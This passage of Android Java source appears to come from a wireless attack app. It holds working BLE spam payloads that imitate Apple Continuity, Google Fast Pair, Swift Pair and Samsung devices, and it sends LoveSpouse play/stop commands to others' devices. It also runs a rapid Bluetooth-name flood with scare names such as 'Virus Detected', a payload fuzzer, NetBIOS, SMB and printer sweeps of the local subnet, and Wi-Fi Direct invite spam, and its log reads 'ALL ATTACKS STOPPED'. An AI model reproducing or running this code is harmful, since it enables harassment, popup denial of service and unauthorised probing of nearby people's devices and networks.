        case 12: case 13: { String[] cmds={"E49C6C","E5157D"}; byte[] lpre=hexToBytes("FFFF006DB643CE97FE427C"); byte[] lkey=hexToBytes(cmds[mode-12]); byte[] lapp=hexToBytes("03038FAE"); byte[] lp=new byte[lpre.length+lkey.length+lapp.length]; System.arraycopy(lpre,0,lp,0,lpre.length); System.arraycopy(lkey,0,lp,lpre.length,lkey.length); System.arraycopy(lapp,0,lp,lpre.length+lkey.length,lapp.length); d=new AdvertiseData.Builder().setIncludeDeviceName(true).addManufacturerData(0x00FF,lp).build(); break; }
        case 15: { // Settings Flood — rapid name cycling
            String[] floodNames = {"FBI Surveillance Van","NSA Listening Post","Police Drone #42",
                "⚠ Security Breach","This Device Tracked","Microphone Active","Camera Remote",
                "Free WiFi No Pass","Mom's iPhone","Hacked Device","Windows Alert",
                "Virus Detected","iCloud Locked","Payment Expired","Critical Update"};
            String floodName = floodNames[(int)(Math.random()*floodNames.length)] + " #" + ((int)(Math.random()*99));
            d = new AdvertiseData.Builder().setIncludeDeviceName(true).build();
            // Set device name for the advertisement via BluetoothAdapter
            try { btAdapter.setName(floodName); } catch (Exception e) {}
            log("  📛 Flood: " + floodName);
            break; }
        case 20: { // WiFi scan trigger — Android API scan request, not raw 802.11 injection
            String[] trollSSIDs = {"FBI_Surveillance","NSA_Listening_Post","Free_WiFi_Here",
                "HACKED_NETWORK","STARBUCKS_WIFI","xfinitywifi","attwifi",
                "Police_Drone_7","INFECTED_DEVICE","Your_IP_Exposed"};
            String ssid = trollSSIDs[(int)(Math.random()*trollSSIDs.length)] + "_" + ((int)(Math.random()*999));
            log("  📡 WiFi scan trigger seed: " + ssid);
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            if (wm != null) { try { wm.startScan(); } catch (Exception e) {} }
            // Fall through to normal postDelayed — cycling advances normally
            d = new AdvertiseData.Builder().setIncludeDeviceName(false).build();
            break; }
        case 17: { // AirDrop — continuity type 0x00, 18 bytes
            byte[] ad = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),0x00};
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x004C, ad).build();
            break; }
        case 18: { // Handoff — continuity type 0x03, 14 bytes
            byte[] ho = {0x01,(byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256),(byte)(Math.random()*256),
                (byte)(Math.random()*256)};
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x004C, ho).build();
            break; }
        case 19: { // Tethering Source — continuity type 0x04, 6 bytes
            byte[] ts = {0x01,(byte)(Math.random()*256),(byte)(Math.random()*101),
                0x00,(byte)(Math.random()*8),(byte)(Math.random()*5)};
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x004C, ts).build();
            break; }
        case 16: { // 🔥 AGGRESSIVE (200ms): sends Swift Pair at high speed
            byte[] sp2 = new byte[3 + name.length()]; sp2[0]=0x03; sp2[1]=0x00; sp2[2]=(byte)0x80;
            System.arraycopy(name.getBytes(),0,sp2,3,name.length());
            d = new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x0006,sp2).build();
            log("  🔥 AGGRESSIVE 200ms"); updateStatus("AGGRESSIVE");
            break; }
        case 14: { String rsn = name.length() >= 6 ? name.substring(0,6) : "797751";
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid.fromString("0000FD56-0000-1000-8000-00805F9B34FB"))
                .addManufacturerData(0x038D, new byte[]{0x00}).build();
            // Also set device name in scan response
            break; }
        case 21: { // Nearby Share
            byte[] ns = new byte[20];
            for (int ni = 0; ni < 20; ni++) ns[ni] = (byte)(Math.random()*256);
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid.fromString("0000FC8E-0000-1000-8000-00805F9B34FB"))
                .addServiceData(ParcelUuid.fromString("0000FC8E-0000-1000-8000-00805F9B34FB"), ns).build();
            break; }
        case 22: { // Eddystone-UID
            byte[] eddy = new byte[20];
            eddy[0] = 0x00; eddy[1] = (byte)(-41 + (int)(Math.random()*82));
            for (int ei = 2; ei < 20; ei++) eddy[ei] = (byte)(Math.random()*256);
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"))
                .addServiceData(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"), eddy).build();
            break; }
        case 23: { // Eddystone-URL
            byte[] eddyUrl = new byte[10];
            eddyUrl[0] = 0x10; eddyUrl[1] = (byte)(-41 + (int)(Math.random()*82));
            eddyUrl[2] = 0x00;
            for (int ei = 3; ei < 10; ei++) eddyUrl[ei] = (byte)(Math.random()*26 + 'a');
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"))
                .addServiceData(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"), eddyUrl).build();
            break; }
        case 24: { // iBeacon
            byte[] ib = new byte[23];
            ib[0] = 0x02; ib[1] = 0x15;
            for (int ii = 2; ii < 23; ii++) ib[ii] = (byte)(Math.random()*256);
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x004C, ib).build();
            break; }
        case 25: { // Find My-like Apple manufacturer seed
            byte[] fm = new byte[24];
            fm[0] = 0x07; fm[1] = 0x19;
            for (int fi = 2; fi < 24; fi++) fm[fi] = (byte)(Math.random()*256);
            fm[6] = (byte)(Math.random()*100); fm[7] = (byte)(Math.random()*100);
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addManufacturerData(0x004C, fm).build();
            break; }
        case 26: { // Exposure Notification
            byte[] en = new byte[20];
            for (int ei = 0; ei < 20; ei++) en[ei] = (byte)(Math.random()*256);
            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid.fromString("0000FD6F-0000-1000-8000-00805F9B34FB"))
                .addServiceData(ParcelUuid.fromString("0000FD6F-0000-1000-8000-00805F9B34FB"), en).build();
            break; }
        default: return;
        }
        BleFireCb cb = new BleFireCb();
        activeBleFireCb = cb;
        adv.startAdvertising(s, d, cb);
        final int delay = (currentBleMode == 16) ? 200 : 2000;
        mainHandler.postDelayed(new Runnable() { public void run() { try { BluetoothLeAdvertiser a = btAdapter.getBluetoothLeAdvertiser(); if (a != null) a.stopAdvertising(cb); } catch (Exception e) {} if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 27; } fireTargetedBle(); } }}, delay);
        } catch (SecurityException e) { log("✕ Permission: BLUETOOTH_ADVERTISE"); if (isCycling) { isCycling = false; isBleTargetActive = false; resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES"); log("🛑 Cycle halted — grant BLE advertise permission"); } else { isBleTargetActive = false; } resetBtn(btnBleFire, "🔥 FIRE"); }
          catch (Exception e) { log("✕ BLE: " + e.getMessage()); if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 27; log("  ↻ Skipping mode, cycling to next..."); } mainHandler.postDelayed(new Runnable() { public void run() { fireTargetedBle(); }}, 500); } }
    }

    private class BleFireCb extends AdvertiseCallback {
        public void onStartSuccess(AdvertiseSettings s) {}
        public void onStartFailure(int code) { if (isBleTargetActive) mainHandler.postDelayed(new Runnable() { public void run() { fireTargetedBle(); }}, 2000); }
    }

    // ═══════════════════════════════════════════
    //  FUZZ PAYLOAD BUILDERS
    // ═══════════════════════════════════════════

    private AdvertiseData buildFuzzAdvertiseData(int profile, int pos, int value, String name) {
        if (profile < 0 || profile >= FUZZ_PROFILE_LABELS.length) profile = FUZZ_SWIFT_PAIR;
        switch (profile) {
            case FUZZ_SWIFT_PAIR:
                return manufacturerFuzz(0x0006, swiftPairPayload(name), pos, value);
            case FUZZ_FAST_PAIR_CD8256:
                return fastPairFuzz("CD8256", pos, value);
            case FUZZ_FAST_PAIR_F52494:
                return fastPairFuzz("F52494", pos, value);
            case FUZZ_FAST_PAIR_718FA4:
                return fastPairFuzz("718FA4", pos, value);
            case FUZZ_FAST_PAIR_821F66:
                return fastPairFuzz("821F66", pos, value);
            case FUZZ_FAST_PAIR_92BBBD:
                return fastPairFuzz("92BBBD", pos, value);
            case FUZZ_APPLE_NEARBY_ACTION:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x0F, 0x05, (byte)0xC0, 0x13, 0x00, 0x00, 0x00
                }, pos, value);
            case FUZZ_APPLE_AIRDROP:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,
                    0x10,0x20,0x30,0x40,0x50,0x60,0x70,0x7F,0x00
                }, pos, value);
            case FUZZ_APPLE_HANDOFF:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x01,0x10,0x20,0x30,0x40,0x50,0x60,
                    0x70,0x7F,0x11,0x22,0x33,0x44,0x55
                }, pos, value);
            case FUZZ_APPLE_TETHERING:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x01,0x22,0x64,0x00,0x03,0x02
                }, pos, value);
            case FUZZ_APPLE_IBEACON:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x02,0x15,0x01,0x12,0x23,0x34,0x45,0x56,0x67,0x78,
                    (byte)0x89,(byte)0x9A,(byte)0xAB,(byte)0xBC,(byte)0xCD,
                    (byte)0xDE,(byte)0xEF,0x00,0x01,0x00,0x02,(byte)0xC5
                }, pos, value);
            case FUZZ_APPLE_FIND_MY_SEED:
                return manufacturerFuzz(0x004C, new byte[] {
                    0x07,0x19,0x05,0x00,0x55,0x10,0x20,0x30,
                    0x40,0x00,0x11,0x22,0x33,0x44,0x55,0x66,
                    0x77,0x7F,0x01,0x02,0x03,0x04,0x05,0x06
                }, pos, value);
            case FUZZ_SAMSUNG_BUDS_SEED:
                return manufacturerFuzz(0x0075, samsungBudsPayload(), pos, value);
            case FUZZ_SAMSUNG_WATCH_SEED:
                return manufacturerFuzz(0x0075, combine(hexToBytes("010002000101FF000043"), new byte[] {0x01}), pos, value);
            case FUZZ_LOVESPOUSE_PLAY:
                return manufacturerFuzz(0x00FF, loveSpousePayload("E49C6C"), pos, value);
            case FUZZ_LOVESPOUSE_STOP:
                return manufacturerFuzz(0x00FF, loveSpousePayload("E5157D"), pos, value);
            case FUZZ_AIRSENSE_SEED:
                return new AdvertiseData.Builder().setIncludeDeviceName(false)
                    .addServiceUuid(ParcelUuid.fromString("0000FD56-0000-1000-8000-00805F9B34FB"))
                    .addManufacturerData(0x038D, fuzzPayload(new byte[] {0x00}, pos, value))
                    .build();
            case FUZZ_NEARBY_SHARE_SEED:
                return serviceFuzz("0000FC8E-0000-1000-8000-00805F9B34FB", new byte[] {
                    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,
                    0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,0x13,0x14
                }, pos, value);
            case FUZZ_EDDYSTONE_UID:
                return serviceFuzz("0000FEAA-0000-1000-8000-00805F9B34FB", new byte[] {
                    0x00,(byte)0xC5,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
                    0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x00,0x00
                }, pos, value);
            case FUZZ_EDDYSTONE_URL:
                return serviceFuzz("0000FEAA-0000-1000-8000-00805F9B34FB", new byte[] {
                    0x10,(byte)0xC5,0x00,'o','b','l','i','t','e','r'
                }, pos, value);
            case FUZZ_EXPOSURE_NOTIFY_SEED:
                return serviceFuzz("0000FD6F-0000-1000-8000-00805F9B34FB", new byte[] {
                    0x01,0x00,0x02,0x00,0x03,0x00,0x04,0x00,0x05,0x00,
                    0x06,0x00,0x07,0x00,0x08,0x00,0x09,0x00,0x0A,0x00
                }, pos, value);
            default:
                return manufacturerFuzz(0x0006, swiftPairPayload(name), pos, value);
        }
    }

    private AdvertiseData fastPairFuzz(String modelHex, int pos, int value) {
        ParcelUuid fastPairUuid = ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB");
        byte[] model = fuzzPayload(hexToBytes(modelHex), pos, value);
        return new AdvertiseData.Builder().setIncludeDeviceName(false)
            .addServiceUuid(fastPairUuid)
            .addServiceData(fastPairUuid, model)
            .build();
    }

    private AdvertiseData manufacturerFuzz(int manufacturerId, byte[] seed, int pos, int value) {
        return new AdvertiseData.Builder().setIncludeDeviceName(false)
            .addManufacturerData(manufacturerId, fuzzPayload(seed, pos, value))
            .build();
    }

    private AdvertiseData serviceFuzz(String uuid, byte[] seed, int pos, int value) {
        ParcelUuid serviceUuid = ParcelUuid.fromString(uuid);
        return new AdvertiseData.Builder().setIncludeDeviceName(false)
            .addServiceUuid(serviceUuid)
            .addServiceData(serviceUuid, fuzzPayload(seed, pos, value))
            .build();
    }

    private byte[] swiftPairPayload(String name) {
        byte[] nameBytes = textBytesLimited(name, 20);
        byte[] payload = new byte[3 + nameBytes.length];
        payload[0] = 0x03;
        payload[1] = 0x00;
        payload[2] = (byte)0x80;
        System.arraycopy(nameBytes, 0, payload, 3, nameBytes.length);
        return payload;
    }

    private byte[] samsungBudsPayload() {
        return combine(hexToBytes("42098102141503210109"),
            hexToBytes("1234015678"),
            hexToBytes("063C948E00000000C700"));
    }

    private byte[] loveSpousePayload(String commandHex) {
        return combine(hexToBytes("FFFF006DB643CE97FE427C"),
            hexToBytes(commandHex),
            hexToBytes("03038FAE"));
    }

    private byte[] fuzzPayload(byte[] seed, int pos, int value) {
        int safePos = Math.max(0, pos);
        byte[] out = Arrays.copyOf(seed, Math.max(seed.length, safePos + 1));
        out[safePos] = (byte)(value & 0xFF);
        return out;
    }

    private byte[] textBytesLimited(String text, int maxBytes) {
        byte[] bytes = text != null ? text.getBytes() : new byte[0];
        if (bytes.length <= maxBytes) return bytes;
        return Arrays.copyOf(bytes, maxBytes);
    }

    private byte[] combine(byte[]... parts) {
        int len = 0;
        for (byte[] part : parts) len += part != null ? part.length : 0;
        byte[] out = new byte[len];
        int offset = 0;
        for (byte[] part : parts) {
            if (part == null) continue;
            System.arraycopy(part, 0, out, offset, part.length);
            offset += part.length;
        }
        return out;
    }

    private void stopFuzzAdvertising() {
        if (fuzzCallback == null || btAdapter == null) return;
        try {
            BluetoothLeAdvertiser adv = btAdapter.getBluetoothLeAdvertiser();
            if (adv != null) adv.stopAdvertising(fuzzCallback);
        } catch (Exception e) {}
        fuzzCallback = null;
    }


    // ═══════════════════════════════════════════
    //  NETWORK ENUMERATION
    // ═══════════════════════════════════════════

    private void scanNetbios() {
        log("🔍 NetBIOS scan...");
        capturedSubnetPrefix = captureSubnetPrefixForScan();
        final String prefix = capturedSubnetPrefix;
        new Thread(new Runnable() { public void run() {
            stopNetbiosScan = false; stopNetScan = false;
            for (int i = 1; i <= 254 && !stopNetbiosScan && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                java.net.DatagramSocket ds = null;
                try {
                    ds = new java.net.DatagramSocket();
                    ds.setSoTimeout(400);
                    byte[] nb = new byte[50];
                    nb[0]=(byte)0x82; nb[1]=0x28; nb[5]=1; nb[45]=(byte)0x20; nb[46]=0x43; nb[47]=0x4B;
                    java.net.DatagramPacket dp = new java.net.DatagramPacket(nb,50,java.net.InetAddress.getByName(ip),137);
                    ds.send(dp); ds.receive(dp);
                    if(dp.getLength()>0){
                        String data = new String(dp.getData(),0,dp.getLength(),"ASCII").replaceAll("[^\\x20-\\x7E]",".");
                        final String r = "  💻 "+ip+" NetBIOS: "+data.substring(0,Math.min(40,data.length()));
                        mainHandler.post(new Runnable(){public void run(){log(r);}});
                    }
                } catch (Exception e) {}
                finally { if (ds != null) ds.close(); }
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ NetBIOS done"); updateStatus("READY");}});
        }}).start();
        updateStatus("SCANNING NETBIOS");
    }

    private void scanSmb() {
        log("📁 SMB scan...");
        capturedSubnetPrefix = captureSubnetPrefixForScan();
        final String prefix = capturedSubnetPrefix;
        new Thread(new Runnable() { public void run() {
            stopSmbScan = false; stopNetScan = false;
            for (int i = 1; i <= 254 && !stopSmbScan && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                java.net.Socket s = null;
                try {
                    s = new java.net.Socket();
                    s.connect(new java.net.InetSocketAddress(ip,445),600);
                    byte[] smb = {0x00,0x00,0x00,(byte)0xA4,(byte)0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,(byte)0xC8,0x00,0x26,(byte)0xFE,(byte)0xFE,(byte)0xFE,(byte)0xFE,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
                    java.io.OutputStream os = s.getOutputStream(); java.io.InputStream is = s.getInputStream();
                    os.write(smb); os.flush();
                    byte[] resp = new byte[512]; int len = is.read(resp);
                    if(len>0){
                        String d = ""; for(int j=40;j<len;j++){if(resp[j]>=32&&resp[j]<127)d+=(char)resp[j];else if(resp[j]==0)d+=" ";}
                        final String r = "  📁 "+ip+":445 SMB: "+d.trim();
                        mainHandler.post(new Runnable(){public void run(){log(r);}});
                    }
                } catch (Exception e) {}
                finally { if (s != null) try { s.close(); } catch (Exception ex) {} }
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ SMB done"); updateStatus("READY");}});
        }}).start();
        updateStatus("SCANNING SMB");
    }

    private void scanPrinters() {
        log("🖨️ Printer scan...");
        capturedSubnetPrefix = captureSubnetPrefixForScan();
        final String prefix = capturedSubnetPrefix;
        new Thread(new Runnable() { public void run() {
            stopPrinterScan = false; stopNetScan = false;
            int[] ports = {9100,515,631,80,443,8080};
            String[] names = {"RAW","LPR","IPP","HTTP","HTTPS","HTTP-ALT"};
            for (int i = 1; i <= 254 && !stopPrinterScan && !stopNetScan; i++) {
                final String ip = prefix + "." + i;
                for (int p = 0; p < ports.length; p++) {
                    java.net.Socket s = null;
                    try {
                        s = new java.net.Socket(); s.connect(new java.net.InetSocketAddress(ip,ports[p]),500);
                        final String r = "  🖨️ "+ip+":"+ports[p]+" "+names[p];
                        mainHandler.post(new Runnable(){public void run(){log(r);}});
                    } catch (Exception e) {}
                    finally { if (s != null) try { s.close(); } catch (Exception ex) {} }
                }
            }
            mainHandler.post(new Runnable(){public void run(){log("✅ Printers done"); updateStatus("READY");}});
        }}).start();
        updateStatus("SCANNING PRINTERS");
    }

    private void scanAllNetwork() {
        log("🔍 Full network enum...");
        stopNetScan = false; stopNetbiosScan = false; stopSmbScan = false; stopPrinterScan = false;
        capturedSubnetPrefix = captureSubnetPrefixForScan();
        scanNetbios();
        new Thread(new Runnable(){public void run(){
            try{Thread.sleep(3000);}catch(Exception e){}
            if (!stopNetScan && !stopSmbScan) scanSmb();
            try{Thread.sleep(3000);}catch(Exception e){}
            if (!stopNetScan && !stopPrinterScan) scanPrinters();
        }}).start();
    }

    private String getSubnetPrefix() {
        if (capturedSubnetPrefix != null) return capturedSubnetPrefix;
        return readSubnetPrefixFromUi();
    }

    private String captureSubnetPrefixForScan() {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            capturedSubnetPrefix = readSubnetPrefixFromUi();
        } else if (capturedSubnetPrefix == null) {
            capturedSubnetPrefix = getLocalSubnetPrefix();
        }
        return capturedSubnetPrefix;
    }

    private String readSubnetPrefixFromUi() {
        try {
            // Check if user entered a subnet prefix
            if (subnetInput != null && subnetInput.getText() != null && subnetInput.getText().length() > 0) {
                String manual = subnetInput.getText().toString().trim();
                if (manual.matches("\\d+\\.\\d+\\.\\d+")) return manual;
            }
        } catch (Exception e) {}
        return getLocalSubnetPrefix();
    }

    private String getLocalSubnetPrefix() {
        try{String ip=getLocalIp(); return ip.substring(0,ip.lastIndexOf('.'));}catch(Exception e){return "192.168.1";}
    }

    private String getLocalIp() {
        try{java.net.Socket s=new java.net.Socket("8.8.8.8",53); String ip=s.getLocalAddress().getHostAddress(); s.close(); return ip;}catch(Exception e){return "192.168.1.80";}
    }

    //  STOP ALL
    // ═══════════════════════════════════════════

    private void stopAll() {
        isDiscSpam = false; isPairSpam = false; isConnSpam = false; isBleSpam = false; isWifiSpam = false;
        isBleTargetActive = false; isCycling = false; isFuzzActive = false;
        stopNetScan = true; stopNetbiosScan = true; stopSmbScan = true; stopPrinterScan = true;
        isProbeFlood = false; isBtNameTurbo = false;
        isMdnsSpoof = false; isSsdpSpoof = false; isHoneypot = false;
        if (btAdapter != null && btAdapter.isDiscovering()) btAdapter.cancelDiscovery();
        if (leScanner != null && activeBleScanCb != null) try { leScanner.stopScan(activeBleScanCb); } catch (Exception e) {}
        // Stop active BLE advertisers
        if (btAdapter != null) {
            BluetoothLeAdvertiser adv = btAdapter.getBluetoothLeAdvertiser();
            if (adv != null) {
                if (fuzzCallback != null) { try { adv.stopAdvertising(fuzzCallback); } catch (Exception e) {} fuzzCallback = null; }
                if (activeBleAdCb != null) { try { adv.stopAdvertising(activeBleAdCb); } catch (Exception e) {} activeBleAdCb = null; }
                if (activeBleFireCb != null) { try { adv.stopAdvertising(activeBleFireCb); } catch (Exception e) {} activeBleFireCb = null; }
            }
        }
        if (wifiP2pManager != null && wifiChannel != null)
            try { wifiP2pManager.stopPeerDiscovery(wifiChannel, null); } catch (Exception e) {}
        resetBtn(btnDiscSpam, "📡 DISC FLOOD");
        resetBtn(btnPairSpam, "🔗 PAIR SPAM");
        resetBtn(btnConnSpam, "🔄 CONN FLOOD");
        resetBtn(btnBleSpam, "📶 BLE SPAM");
        resetBtn(btnWifiSpam, "📡 WIFI DIRECT SPAM");
        resetBtn(btnBleFire, "🔥 FIRE");
        resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
        releaseWakeLock(); updateStatus("READY");
        log("🛑 ALL ATTACKS STOPPED");
    }

    // ═══════════════════════════════════════════
    //  BROADCAST RECEIVERS
    // ═══════════════════════════════════════════

    private BroadcastReceiver mBtReceiver = new BroadcastReceiver() {
        public void onReceive(Context c, Intent i) {
            String a = i.getAction(); if (a == null) return;
            if (BluetoothDevice.ACTION_FOUND.equals(a)) {
                BluetoothDevice d = i.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                short r = i.getShortExtra(BluetoothDevice.EXTRA_RSSI, (short)0);
                if (d != null) { final BluetoothDevice bd = d; final short br = r; mainHandler.post(new Runnable() { public void run() { if (!hasDevice(bd)) addDevice(bd, br); }}); }
            } else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED.equals(a)) {
                if (isDiscSpam) mainHandler.postDelayed(new Runnable() { public void run() { startDiscCycle(); }}, 500);
            } else if (BluetoothAdapter.ACTION_STATE_CHANGED.equals(a)) {
                int st = i.getIntExtra(BluetoothAdapter.EXTRA_STATE, -1);
                if (st == BluetoothAdapter.STATE_ON) { log("✓ BT on"); updateStatus("READY"); }
            }
        }
    };

    private BroadcastReceiver mWifiReceiver = new BroadcastReceiver() {
        public void onReceive(Context c, Intent i) {
            String a = i.getAction();
            if (WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION.equals(a) && isWifiSpam && wifiP2pManager != null && wifiChannel != null) {
                try {
                    wifiP2pManager.requestPeers(wifiChannel, new WifiP2pManager.PeerListListener() {
                        public void onPeersAvailable(WifiP2pDeviceList peers) {
                            wifiPeers.clear();
                            wifiPeers.addAll(peers.getDeviceList());
                            log("  📡 WiFi peers: " + wifiPeers.size());
                            for (WifiP2pDevice p : wifiPeers) {
                                String n = p.deviceName != null ? p.deviceName : p.deviceAddress;
                                log("     " + n + " [" + p.deviceAddress + "]");
                            }
                            // Send connection invites to discovered peers
                            sendWifiInvites();
                        }
                    });
                } catch (Exception e) {}
            }
        }
    };

    // ── BT SDP UUID Receiver for Inspector ──
    private BroadcastReceiver mBtUuidReceiver = new BroadcastReceiver() {
        public void onReceive(Context c, Intent i) {
            BluetoothDevice d = i.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
            if (d == null || inspectTarget == null) return;
            if (!d.getAddress().equals(inspectTarget.getAddress())) return;
            Parcelable[] uuids = i.getParcelableArrayExtra(BluetoothDevice.EXTRA_UUID);
            BluetoothClass btClass = d.getBluetoothClass();
            final StringBuilder sb = new StringBuilder();
            sb.append("\n╔════════════════════════════════╗\n");
            sb.append("║  BT DEVICE INSPECTOR           ║\n");
            sb.append("╚════════════════════════════════╝\n");
            sb.append("  Name:      ").append(getName(d)).append("\n");
            sb.append("  Address:   ").append(d.getAddress()).append("\n");
            sb.append("  Bond:      ").append(d.getBondState() == BluetoothDevice.BOND_BONDED ? "PAIRED" : "not paired").append("\n");
            if (btClass != null) {
                sb.append("  Class:     0x").append(Integer.toHexString(btClass.getDeviceClass())).append("\n");
                sb.append("  Type:      ").append(getDeviceTypeName(btClass.getMajorDeviceClass())).append("\n");
                sb.append("  Sub-type:  ").append(getDeviceSubType(btClass)).append("\n");
            }
            sb.append("  Services (UUIDs):\n");
            if (uuids != null && uuids.length > 0) {
                for (Parcelable p : uuids) {
                    String uid = p.toString().toUpperCase();
                    sb.append("    • ").append(uid).append("\n");
                    sb.append("      ").append(getUuidName(uid)).append("\n");
                }
            } else {
                sb.append("    (no SDP services exposed)\n");
            }
            final String result = sb.toString();
            mainHandler.post(new Runnable() { public void run() {
                log(result);
                updateStatus("INSPECT DONE");
            }});
            inspectTarget = null;
        }
    };

    // ── BT Device Type Names ──
    private String getDeviceTypeName(int majorClass) {
        return ObBluetooth.deviceTypeName(majorClass);
    }
    
    private String getDeviceSubType(BluetoothClass btClass) {
        return ObBluetooth.deviceSubType(btClass);
    }
    
    private String getUuidName(String uuid) {
        return ObBluetooth.uuidName(uuid);
    }

    // ── BT INSPECTOR ──
    private void inspectBtDevice() {
        // Build list of discovered devices for dialog
        final ArrayList<BluetoothDevice> devs;
        synchronized (discoveredDevices) { devs = new ArrayList<>(discoveredDevices); }
        if (devs.isEmpty()) { log("✕ No devices discovered. Scan first."); return; }
        final String[] names = new String[devs.size()];
        for (int i = 0; i < devs.size(); i++) {
            BluetoothDevice d = devs.get(i);
            BluetoothClass c = d.getBluetoothClass();
            String type = c != null ? getDeviceTypeName(c.getMajorDeviceClass()) : "?";
            int bond = d.getBondState();
            String b = bond == BluetoothDevice.BOND_BONDED ? " [paired]" : "";
            names[i] = (i+1) + ". " + getName(d) + "  " + type + b;
        }
        // Show picker dialog
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("🔍 Select Device to Inspect");
        builder.setItems(names, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                inspectTarget = devs.get(which);
                log("🔍 Inspecting: " + getName(inspectTarget) + " [" + inspectTarget.getAddress() + "]");
                log("  Querying SDP services...");
                updateStatus("INSPECTING...");
                try {
                    inspectTarget.fetchUuidsWithSdp();
                } catch (SecurityException e) {
                    log("✕ SDP query failed: permission denied");
                    inspectTarget = null;
                }
            }
        });
        builder.setNegativeButton("Cancel", null);
        if (activeInspectDialog != null) try { activeInspectDialog.dismiss(); } catch (Exception e) {}
        activeInspectDialog = builder.create();
        activeInspectDialog.show();
    }

    // ── LAN SCANNER (ARP table) ──
    private void scanLan() {
        log("🖧 Scanning LAN via ARP table...");
        updateStatus("LAN SCAN");
        new Thread(new Runnable() { public void run() {
            java.io.BufferedReader br = null;
            try {
                br = new java.io.BufferedReader(new java.io.FileReader("/proc/net/arp"));
                String line;
                int count = 0;
                final StringBuilder sb = new StringBuilder();
                sb.append("\n🖧 LAN DEVICES (ARP):\n");
                br.readLine(); // skip header
                while ((line = br.readLine()) != null) {
                    String[] p = line.trim().split("\\s+");
                    if (p.length >= 4) {
                        String ip = p[0];
                        String mac = p[3];
                        if (!mac.equals("00:00:00:00:00:00") && mac.contains(":")) {
                            count++;
                            String vendor = getMacVendor(mac);
                            String name = resolveHostname(ip);
                            sb.append("  ").append(ip).append("  ").append(mac);
                            if (vendor != null) sb.append("  [").append(vendor).append("]");
                            if (name != null) sb.append("  ").append(name);
                            sb.append("\n");
                        }
                    }
                }
                sb.append("  Total: ").append(count).append(" devices\n");
                if (count == 0) sb.append("  (No devices in ARP table. Connect to WiFi first.)\n");
                final String result = sb.toString();
                mainHandler.post(new Runnable() { public void run() {
                    log(result);
                    updateStatus("READY");
                }});
            } catch (Exception e) {
                mainHandler.post(new Runnable() { public void run() {
                    log("✕ LAN scan failed: " + e.getMessage());
                    log("  Make sure WiFi is connected to a network");
                    updateStatus("READY");
                }});
            } finally {
                if (br != null) try { br.close(); } catch (Exception ex) {}
            }
        }}).start();
    }

    private String getMacVendor(String mac) {
        return ObNet.macVendor(mac);
    }

    private String resolveHostname(String ip) {
        return ObNet.resolveHostname(ip);
    }

    private void sendWifiInvites() {
        if (!isWifiSpam || wifiPeers.isEmpty()) return;
        String spoofName = spoofNameInput.getText().toString();
        
        for (WifiP2pDevice peer : wifiPeers) {
            if (!isWifiSpam) break;
            String peerName = peer.deviceName != null ? peer.deviceName : peer.deviceAddress;
            
            WifiP2pConfig config = new WifiP2pConfig();
            config.deviceAddress = peer.deviceAddress;
            // Configure group owner intent (0 = let other device be owner)
            try {
                java.lang.reflect.Field f = config.getClass().getField("groupOwnerIntent");
